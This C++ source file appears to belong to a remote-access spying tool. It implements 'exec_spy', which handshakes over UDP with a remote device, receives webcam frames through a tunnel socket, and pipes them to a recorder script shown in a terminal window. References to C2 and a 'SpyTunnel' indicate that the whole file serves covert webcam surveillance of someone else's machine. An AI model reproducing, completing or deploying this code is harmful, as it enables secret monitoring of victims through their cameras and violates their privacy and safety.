#include "webcam_recorder.hpp"

void WebcamRecorder::exec_spy() {
    int rc = udp_handshake(&dev_num_, sizeof(dev_num_));
    if (rc < 0) {
        return;
    }

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        return;
    }

    struct epoll_event frame_event;
    frame_event.data.fd = tunnel_socket_;
    frame_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_socket_, &frame_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
        return;
    } 

    char frame[PIX_HEIGHT * PIX_WIDTH + BUFFER_SIZE];
    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds < 0) {
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return;
            } if (events[i].data.fd == tunnel_socket_) {
                int bytes_read = recvfrom(tunnel_socket_, frame, sizeof(frame), 0, (struct sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
                if (bytes_read < 0) {
                    write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
                    return;
                } else if (bytes_read == 0) {
                    write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                    return;
                } else {
                    if (memcmp(frame, OUT_KEY, OUT_KEY_LEN) == 0) {
                        write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
                        return;
                    }
                    rc = write(tunnel_fifo_, frame, bytes_read);
                    if (rc < 0) {
                        return;
                    }
                }
            }
        }


    }
}

void WebcamRecorder::spawn_window() {
    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_wr", "-e", WEBCAM_RECORDER_SCRIPT_PATH, fifo_path_.c_str(), out_name_.c_str(), (char*)NULL);
}